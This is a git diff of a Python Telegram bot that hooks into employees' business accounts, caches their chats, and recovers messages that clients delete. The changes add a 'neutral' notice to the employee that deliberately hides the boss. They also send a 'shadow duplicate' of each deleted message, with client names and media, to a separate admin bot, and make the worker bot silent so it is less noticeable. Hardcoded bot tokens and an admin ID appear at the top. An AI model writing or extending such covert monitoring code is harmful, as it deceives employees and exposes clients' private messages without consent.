@@ -8,16 +8,13 @@ from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection
 from aiogram.filters import CommandStart
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 
-# 1. Рабочий бот-агент с новым нейтральным юзернеймом
+# 1. Рабочий бот-агент
 WORKER_BOT_TOKEN = "9037468297:AAHcgo_p0YCXt5YW6YFPkStZ5iv-l-7tGRs"
 
 # 2. Твой личный пульт управления
 ADMIN_BOT_TOKEN = "9016978475:AAErV3MiXNyRhXFJns_b6ybiEGtAXmIaG48"
 
-# Твой личный Telegram ID
 MY_ADMIN_ID = 8026731485
-
-# Адрес сервиса на Render
 WEBAPP_URL = "https://btgm11-1.onrender.com"
 
 worker_bot = Bot(token=WORKER_BOT_TOKEN)
@@ -56,12 +53,13 @@ async def init_db():
         await db.commit()
 
 # ==========================================
-# 1. РАБОЧИЙ БОТ (БЕЗ ПАЛЕВА ДЛЯ СОТРУДНИКОВ)
+# 1. РАБОЧИЙ БОТ (АНТИ-УДАЛЯТЕЛЬ ДЛЯ СОТРУДНИКОВ)
 # ==========================================
 
-@dp_worker.message(CommandStart())
-async def worker_start(message: Message):
-    await message.answer("Служба бизнес-синхронизации активна.")
+# На прямые сообщения и /start бот сотрудникам полностью молчит
+@dp_worker.message()
+async def worker_ignore_all(message: Message):
+    return
 
 @dp_worker.business_connection()
 async def worker_business_connection(connection: BusinessConnection):
@@ -82,7 +80,7 @@ async def worker_business_connection(connection: BusinessConnection):
                     parse_mode="HTML"
                 )
             except Exception as e:
-                print(f"Ошибка отправки алерта: {e}")
+                print(f"Ошибка отправки алерта шефу: {e}")
         else:
             await db.execute("DELETE FROM accounts WHERE connection_id = ?", (conn_id,))
             try:
@@ -92,13 +90,14 @@ async def worker_business_connection(connection: BusinessConnection):
                     parse_mode="HTML"
                 )
             except Exception as e:
-                print(f"Ошибка отправки алерта: {e}")
+                print(f"Ошибка отправки алерта шефу: {e}")
         await db.commit()
 
 @dp_worker.business_message()
 async def worker_cache_message(message: Message):
     conn_id = message.business_connection_id
 
+    # Игнорируем ответы самих сотрудников
     async with aiosqlite.connect(DB_FILE) as db:
         async with db.execute("SELECT user_id FROM accounts WHERE connection_id = ?", (conn_id,)) as cursor:
             row = await cursor.fetchone()
@@ -158,11 +157,12 @@ async def worker_deleted_messages(event: BusinessMessagesDeleted):
     conn_id = event.business_connection_id
 
     async with aiosqlite.connect(DB_FILE) as db:
-        acc_name = "Неизвестный профиль"
-        async with db.execute("SELECT account_name FROM accounts WHERE connection_id = ?", (conn_id,)) as cursor:
+        acc_name = "Рабочий аккаунт"
+        worker_user_id = None
+        async with db.execute("SELECT account_name, user_id FROM accounts WHERE connection_id = ?", (conn_id,)) as cursor:
             acc_row = await cursor.fetchone()
             if acc_row:
-                acc_name = acc_row[0]
+                acc_name, worker_user_id = acc_row
 
         for msg_id in event.message_ids:
             async with db.execute(
@@ -178,36 +178,59 @@ async def worker_deleted_messages(event: BusinessMessagesDeleted):
                         (msg_id, chat_id)
                     )
 
-                    header = (
+                    # 1. Нейтральный алерт для сотрудника (без упоминания начальника)
+                    worker_text = f"🗑 <b>Удаленное сообщение от {sender}</b>"
+                    if worker_user_id:
+                        try:
+                            if c_type == "text":
+                                await worker_bot.send_message(
+                                    chat_id=worker_user_id,
+                                    text=f"{worker_text}\n💬 {text}",
+                                    parse_mode="HTML"
+                                )
+                            elif c_type == "voice":
+                                await worker_bot.send_message(chat_id=worker_user_id, text=worker_text, parse_mode="HTML")
+                                await worker_bot.send_voice(chat_id=worker_user_id, voice=file_id, caption=text)
+                            elif c_type == "video_note":
+                                await worker_bot.send_message(chat_id=worker_user_id, text=worker_text, parse_mode="HTML")
+                                await worker_bot.send_video_note(chat_id=worker_user_id, video_note=file_id)
+                            elif c_type == "photo":
+                                await worker_bot.send_photo(chat_id=worker_user_id, photo=file_id, caption=f"{worker_text}\n{text}", parse_mode="HTML")
+                            elif c_type == "video":
+                                await worker_bot.send_video(chat_id=worker_user_id, video=file_id, caption=f"{worker_text}\n{text}", parse_mode="HTML")
+                            elif c_type == "document":
+                                await worker_bot.send_document(chat_id=worker_user_id, document=file_id, caption=f"{worker_text}\n{text}", parse_mode="HTML")
+                        except Exception as e:
+                            print(f"Ошибка отправки сотруднику: {e}")
+
+                    # 2. Теневой дубль начальнику в пульт
+                    admin_header = (
                         f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ</b>\n"
                         f"💼 <b>Аккаунт:</b> {acc_name}\n"
                         f"👤 <b>Клиент:</b> {sender} ({username})"
                     )
-
                     try:
                         if c_type == "text":
                             await admin_bot.send_message(
                                 chat_id=MY_ADMIN_ID, 
-                                text=f"{header}\n💬 <b>Текст:</b>\n{text}", 
+                                text=f"{admin_header}\n💬 <b>Текст:</b>\n{text}", 
                                 parse_mode="HTML"
                             )
                         elif c_type == "voice":
-                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n🎤 <b>Голосовое:</b>", parse_mode="HTML")
+                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{admin_header}\n🎤 <b>Голосовое:</b>", parse_mode="HTML")
                             await admin_bot.send_voice(chat_id=MY_ADMIN_ID, voice=file_id, caption=text)
                         elif c_type == "video_note":
-                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n📹 <b>Кружочек:</b>", parse_mode="HTML")
+                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{admin_header}\n📹 <b>Кружочек:</b>", parse_mode="HTML")
                             await admin_bot.send_video_note(chat_id=MY_ADMIN_ID, video_note=file_id)
                         elif c_type == "photo":
-                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n🖼 <b>Фото:</b>", parse_mode="HTML")
-                            await admin_bot.send_photo(chat_id=MY_ADMIN_ID, photo=file_id, caption=text)
+                            await admin_bot.send_photo(chat_id=MY_ADMIN_ID, photo=file_id, caption=f"{admin_header}\n{text}", parse_mode="HTML")
                         elif c_type == "video":
-                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n🎥 <b>Видео:</b>", parse_mode="HTML")
-                            await admin_bot.send_video(chat_id=MY_ADMIN_ID, video=file_id, caption=text)
+                            await admin_bot.send_video(chat_id=MY_ADMIN_ID, video=file_id, caption=f"{admin_header}\n{text}", parse_mode="HTML")
                         elif c_type == "document":
-                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n📁 <b>Документ:</b>", parse_mode="HTML")
-                            await admin_bot.send_document(chat_id=MY_ADMIN_ID, document=file_id, caption=text)
+                            await admin_bot.send_document(chat_id=MY_ADMIN_ID, document=file_id, caption=f"{admin_header}\n{text}", parse_mode="HTML")
                     except Exception as e:
-                        print(f"Ошибка отправки сообщения админу: {e}")
+                        print(f"Ошибка отправки админу: {e}")
+
         await db.commit()
 
 # ==========================================
@@ -217,7 +240,6 @@ async def worker_deleted_messages(event: BusinessMessagesDeleted):
 @dp_admin.message(CommandStart())
 async def admin_start(message: Message):
     if message.from_user.id != MY_ADMIN_ID:
-        await message.answer("Доступ запрещен.")
         return
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
